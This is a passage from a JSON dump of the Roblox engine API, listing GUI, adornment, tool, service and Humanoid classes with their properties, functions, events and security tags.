ype":"Instance"}],"Name":"FocusLost","tags":[],"Class":"TextBox","type":"Event"},{"Arguments":[],"Name":"Focused","tags":[],"Class":"TextBox","type":"Event"},{"Superclass":"GuiBase2d","type":"Class","Name":"LayerCollector","tags":[]},{"Superclass":"LayerCollector","type":"Class","Name":"BillboardGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"PlayerToHideFrom","tags":[],"Class":"BillboardGui"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector2","type":"Property","Name":"SizeOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffset","tags":[],"Class":"BillboardGui"},{"Superclass":"LayerCollector","type":"Class","Name":"ScreenGui","tags":[]},{"Superclass":"ScreenGui","type":"Class","Name":"GuiMain","tags":["deprecated"]},{"Superclass":"LayerCollector","type":"Class","Name":"SurfaceGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"SurfaceGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"SurfaceGui"},{"ValueType":"Vector2","type":"Property","Name":"CanvasSize","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SurfaceGui"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ToolPunchThroughDistance","tags":[],"Class":"SurfaceGui"},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase3d","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":["deprecated","hidden"],"Class":"GuiBase3d"},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"GuiBase3d"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"GuiBase3d"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiBase3d"},{"Superclass":"GuiBase3d","type":"Class","Name":"FloorWire","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"From","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":[],"Class":"FloorWire"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"FloorWire"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"To","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"WireRadius","tags":[],"Class":"FloorWire"},{"Superclass":"GuiBase3d","type":"Class","Name":"PVAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PVAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"HandleAdornment","tags":[]},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"HandleAdornment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"HandleAdornment"},{"ValueType":"Vector3","type":"Property","Name":"SizeRelativeOffset","tags":[],"Class":"HandleAdornment"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"HandleAdornment"},{"Arguments":[],"Name":"MouseButton1Down","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseButton1Up","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseEnter","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseLeave","tags":[],"Class":"HandleAdornment","type":"Event"},{"Superclass":"HandleAdornment","type":"Class","Name":"BoxHandleAdornment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BoxHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ConeHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"ConeHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"ConeHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"CylinderHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"CylinderHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"CylinderHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ImageHandleAdornment","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageHandleAdornment"},{"ValueType":"Vector2","type":"Property","Name":"Size","tags":[],"Class":"ImageHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"LineHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"LineHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"LineHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"SphereHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SphereHandleAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionBox","tags":[]},{"ValueType":"float","type":"Property","Name":"LineThickness","tags":[],"Class":"SelectionBox"},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionBox"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionBox"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionBox"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionSphere","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionSphere"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionSphere"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionSphere"},{"Superclass":"GuiBase3d","type":"Class","Name":"PartAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PartAdornment"},{"Superclass":"PartAdornment","type":"Class","Name":"HandlesBase","tags":[]},{"Superclass":"HandlesBase","type":"Class","Name":"ArcHandles","tags":[]},{"ValueType":"Axes","type":"Property","Name":"Axes","tags":[],"Class":"ArcHandles"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Down","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Up","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"},{"Name":"relativeAngle","Type":"float"},{"Name":"deltaRadius","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseEnter","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseLeave","tags":[],"Class":"ArcHandles","type":"Event"},{"Superclass":"HandlesBase","type":"Class","Name":"Handles","tags":[]},{"ValueType":"Faces","type":"Property","Name":"Faces","tags":[],"Class":"Handles"},{"ValueType":"HandlesStyle","type":"Property","Name":"Style","tags":[],"Class":"Handles"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Down","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Up","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"},{"Name":"distance","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseEnter","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseLeave","tags":[],"Class":"Handles","type":"Event"},{"Superclass":"PartAdornment","type":"Class","Name":"SurfaceSelection","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":[],"Class":"SurfaceSelection"},{"Superclass":"GuiBase3d","type":"Class","Name":"SelectionLasso","tags":[]},{"ValueType":"Object","type":"Property","Name":"Humanoid","tags":[],"Class":"SelectionLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPartLasso","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Part","tags":[],"Class":"SelectionPartLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPointLasso","tags":["deprecated"]},{"ValueType":"Vector3","type":"Property","Name":"Point","tags":[],"Class":"SelectionPointLasso"},{"Superclass":"GuiBase3d","type":"Class","Name":"TextureTrail","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"From","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"To","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"Superclass":"Instance","type":"Class","Name":"GuiItem","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"Backpack","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"BackpackItem","tags":[]},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"BackpackItem"},{"Superclass":"BackpackItem","type":"Class","Name":"HopperBin","tags":["deprecated"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"HopperBin"},{"ValueType":"BinType","type":"Property","Name":"BinType","tags":[],"Class":"HopperBin"},{"ReturnType":"void","Arguments":[],"Name":"Disable","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleSelect","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"Arguments":[],"Name":"Deselected","tags":[],"Class":"HopperBin","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Selected","tags":[],"Class":"HopperBin","type":"Event"},{"Superclass":"BackpackItem","type":"Class","Name":"Tool","tags":[]},{"ValueType":"bool","type":"Property","Name":"CanBeDropped","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Tool"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Grip","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripForward","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripPos","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripRight","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripUp","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"ManualActivationOnly","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"RequiresHandle","tags":[],"Class":"Tool"},{"ValueType":"string","type":"Property","Name":"ToolTip","tags":[],"Class":"Tool"},{"ReturnType":"void","Arguments":[],"Name":"Activate","tags":[],"Class":"Tool","type":"Function"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"Tool","type":"Event"},{"Superclass":"Tool","type":"Class","Name":"Flag","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Flag"},{"Superclass":"GuiItem","type":"Class","Name":"ButtonBindingWidget","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"GuiRoot","tags":["notCreatable"]},{"Superclass":"GuiItem","type":"Class","Name":"Hopper","tags":["deprecated"]},{"Superclass":"GuiItem","type":"Class","Name":"StarterPack","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GuiService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutoSelectGuiEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"CoreGuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"GuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsModalDialog","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsWindows","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"MenuIsOpen","tags":["readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"ScreenGuiEnabled","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedCoreObject","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedObject","tags":[],"Class":"GuiService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null},{"Type":"CenterDialogType","Name":"centerDialogType","Default":null},{"Type":"Function","Name":"showFunction","Default":null},{"Type":"Function","Name":"hideFunction","Default":null}],"Name":"AddCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Instance","Name":"selectionParent","Default":null}],"Name":"AddSelectionParent","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Tuple","Name":"selections","Default":null}],"Name":"AddSelectionTuple","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"AddSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetBrickCount","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"GetClosestDialogToPosition","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetErrorMessage","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUiMessage","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsTenFootInterface","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenBrowserWindow","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null}],"Name":"RemoveCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null}],"Name":"RemoveSelectionGroup","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"RemoveSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"errorMessage","Default":null}],"Name":"SetErrorMessage","tags":["LocalUserSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x1","Default":null},{"Type":"int","Name":"y1","Default":null},{"Type":"int","Name":"x2","Default":null},{"Type":"int","Name":"y2","Default":null}],"Name":"SetGlobalGuiInset","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"open","Default":null}],"Name":"SetMenuIsOpen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UiMessageType","Name":"msgType","Default":null},{"Type":"string","Name":"uiMessage","Default":null}],"Name":"SetUiMessage","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"ShowStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleFullscreen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetScreenResolution","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"YieldFunction"},{"Arguments":[],"Name":"BrowserWindowClosed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"newErrorMessage","Type":"string"}],"Name":"ErrorMessageChanged","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"EscapeKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"},{"Name":"modifiers","Type":"string"}],"Name":"KeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuClosed","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuOpened","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"ShowLeaveConfirmation","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"SpecialKey"},{"Name":"modifiers","Type":"string"}],"Name":"SpecialKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"msgType","Type":"UiMessageType"},{"Name":"newUiMessage","Type":"string"}],"Name":"UiMessageChanged","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"ReturnType":"void","Arguments":[{"Name":"title","Type":"string"},{"Name":"text","Type":"string"}],"Name":"SendCoreUiNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"GuidRegistryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"HapticService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"GetMotor","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"IsMotorSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null}],"Name":"IsVibrationSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null},{"Type":"Tuple","Name":"vibrationValues","Default":null}],"Name":"SetMotor","tags":[],"Class":"HapticService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"HttpRbxApiService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"}],"Name":"GetAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"}],"Name":"PostAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"HttpService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"HttpEnabled","tags":["LocalUserSecurity"],"Class":"HttpService"},{"ReturnType":"string","Arguments":[{"Type":"bool","Name":"wrapInCurlyBraces","Default":"true"}],"Name":"GenerateGUID","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"JSONDecode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"Variant","Name":"input","Default":null}],"Name":"JSONEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"UrlEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"nocache","Default":"false"}],"Name":"GetAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"bool","Name":"compress","Default":"false"}],"Name":"PostAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Humanoid","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"AutoRotate","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"CameraOffset","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidDisplayDistanceType","type":"Property","Name":"DisplayDistanceType","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"Health","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HipHeight","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Jump","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"JumpPower","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"LeftLeg","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxHealth","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxSlopeAngle","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"MoveDirection","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"NameOcclusion","type":"Property","Name":"NameOcclusion","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"PlatformStand","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidRigType","type":"Property","Name":"RigType","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RightLeg","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"SeatPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Sit","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"TargetPoint","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"Torso","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"WalkSpeed","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"WalkToPart","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"WalkToPoint","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"maxHealth","tags":["deprecated"],"Class":"Humanoid"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"AddCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"AddStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":"None"}],"Name":"ChangeState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"tool","Default":null}],"Name":"EquipTool","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"HumanoidStateType","Arguments":[],"Name":"GetState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null}],"Name":"GetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStatuses","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"HasCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"HasStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"moveDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null},{"Type":"Instance","Name":"part","Default":"nil"}],"Name":"MoveTo","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"RemoveCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"RemoveStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetClickToWalkEnabled","tags":["RobloxScriptSecurity"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"TakeDamage","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnequipTools","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"loadAnimation","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"takeDamage","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Climbing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[],"Name":"Died","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FallingDown","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FreeFalling","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"GettingUp","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"health","Type":"float"}],"Name":"HealthChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Jumping","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"reached","Type":"bool"}],"Name":"MoveToFinished","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"PlatformStanding","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name